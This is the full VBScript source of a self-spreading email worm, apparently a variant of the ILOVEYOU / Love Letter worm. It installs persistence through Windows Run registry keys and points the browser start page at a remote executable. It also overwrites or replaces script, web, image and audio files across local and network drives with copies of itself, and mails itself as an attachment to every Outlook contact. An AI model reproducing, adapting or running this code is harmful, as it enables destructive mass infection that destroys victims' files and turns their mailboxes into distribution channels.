rem  barok -loveletter(vbe) <i hate go to school>
rem  by: spyder  / ispyder@mail.com / @GRAMMERSoft Group / Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullName,1)
vbscopy=file.ReadAll
main()
sub main()
 dim wscr,rr
 Set wscr=CreateObject("WScript.Shell")
 rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
 if (rr>=1) then
  wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
 end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set eq = fso.OpenTextFile(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs",2,true)
eq.Write vbscopy
eq.Close
Set ctr = fso.OpenTextFile(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs",2,true)
ctr.Write vbscopy
ctr.Close
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
 Dim num,downread
 regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
 regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
 downread=""
 downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
 if (downread="") then
  downread="c:\"
 end if
 if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Win32BaseServiceMOD",dirsystem&"\WinFAT32.exe"
 end if
 regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdfgjkBjhPOkl†jKlBg†jNlkjbhfewjkbherhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdfgjkBjhPOkljKlBgjNlkjbhfewjkbher/WIN-BUGSFIX.exe"
 regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
end sub
sub listadriv()
 Dim d,dc,s
 Set dc = fso.Drives
 For Each d in dc
  If d.DriveType = 2 or d.DriveType=3 Then
   folderlist(d.driveletter&":\")
  End If
 Next
 spreadtoemail()
end sub
sub infectfiles(folderspec)
 dim f,f1,fc,ext,ap,mop,aw,txtfile,ovwr,mp3,m
 Set f = fso.GetFolder(folderspec)
 Set fc = f.Files
 For Each f1 in fc
  ext=fso.GetExtensionName(f1.path)
  ext=lcase(ext)
  If ext="vbs" then
   Set ap=fso.OpenTextFile(f1.path,2,true)
   ap.Write vbscopy
   ap.Close
  End If
  if ext="vbe" then
   Set ap=fso.OpenTextFile(f1.path,2,true)
   ap.Write vbscopy
   ap.Close
  end if
  if ext="js" then
   Set ap=fso.OpenTextFile(f1.path,2,true)
   ap.Write vbscopy
   ap.Close
  end if
  if ext="jse" then
   Set ap=fso.OpenTextFile(f1.path,2,true)
   ap.Write vbscopy
   ap.Close
  end if
  if ext="css" then
   Set ap=fso.OpenTextFile(f1.path,2,true)
   ap.Write vbscopy
   ap.Close
  end if
  if ext="wsh" then
   Set ap=fso.OpenTextFile(f1.path,2,true)
   ap.Write vbscopy
   ap.Close
  end if
  if ext="sct" then
   Set ap=fso.OpenTextFile(f1.path,2,true)
   ap.Write vbscopy
   ap.Close
  end if
  if ext="hta" then
   Set ap=fso.OpenTextFile(f1.path,2,true)
   ap.Write vbscopy
   ap.Close
  end if
  if ext="jpg" then
   Set ap=fso.OpenTextFile(f1.path&".vbs",2,true)
   ap.Write vbscopy
   ap.Close
   fso.DeleteFile(f1.path)
  end if
  if ext="jpeg" then
   Set ap=fso.OpenTextFile(f1.path&".vbs",2,true)
   ap.Write vbscopy
   ap.Close
   fso.DeleteFile(f1.path)
  end if
  if ext="mp3" then
   Set mp3=fso.CreateTextFile(f1.path&".vbs")
   mp3.Write vbscopy
   mp3.Close
   file.SetFileAttributes f1.path,2
  end if
  if ext="mp2" then
   Set mp3=fso.CreateTextFile(f1.path&".vbs")
   mp3.Write vbscopy
   mp3.Close
   file.SetFileAttributes f1.path,2
  end if
 Next
end sub
sub folderlist(folderspec)
 dim f,f1,fc,sf
 Set f = fso.GetFolder(folderspec)
 Set fc = f.SubFolders
 For Each f1 in fc
  infectfiles(f1.path)
  folderlist(f1.path)
 Next
end sub
sub spreadtoemail()
 dim x,a,ctrlists,ctrentries,s,oApp,oledb,recip,reciptype,addrtype,addr,sor,sv
 Set oApp = CreateObject("Outlook.Application")
 Set oledb = oApp.GetNameSpace("MAPI")
 Set ctrlists=oledb.AddressLists
 For Each a in ctrlists
  if a.AddressListType=2 then
   ctrentries=a.AddressEntries
   For ctr=1 to ctrentries.Count
    Set recip=ctrentries.Item(ctr)
    reciptype=recip.Type
    addrtype=recip.AddressEntry.Type
    addr=recip.AddressEntry.Address
    if reciptype="SMTP" then
     if addrtype="SMTP" then
      sor=sor&addr&";"
     end if
    end if
   Next
  end if
 Next
 sv=split(sor,";")
 for each s in sv
  if s<>"" then
   Set recip=oApp.CreateItem(0)
   recip.Recipients.Add(s)
   recip.Subject = "ILOVEYOU"
   recip.Body = "kindly check the attached LOVELETTER coming from me."
   recip.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
   recip.Send
  end if
 next
end sub
sub html()
 on error resume next
 dim html,dta,b,dt,dtb
 html = "<html><head><script language=vbscript>"&chr(13)&chr(10)
 html = html&"<!--"&chr(13)&chr(10)
 html = html&vbscopy&chr(13)&chr(10)
 html = html&"//-->"&chr(13)&chr(10)
 html = html&"</script><HEAD><BODY>"&chr(13)&chr(10)
 html = html&"</BODY></HTML>"&chr(13)&chr(10)
 Set dt=fso.OpenTextFile(dirwin&"\WIN-BUGSFIX.exe",2,true)
 dt.Write html
 dt.Close
end sub
function regget(value)
 Dim shell
 Set shell = createobject("wscript.shell")
 regget=shell.regread(value)
end function
function regcreate(regkey,regvalue)
 Dim shell
 Set shell = createobject("wscript.shell")
 shell.regwrite regkey,regvalue
end function
function fileexist(filespec)
 Dim gg
 if (fso.FileExists(filespec)) Then
  gg=1
 else
  gg=0
 end if
 fileexist=gg
end function
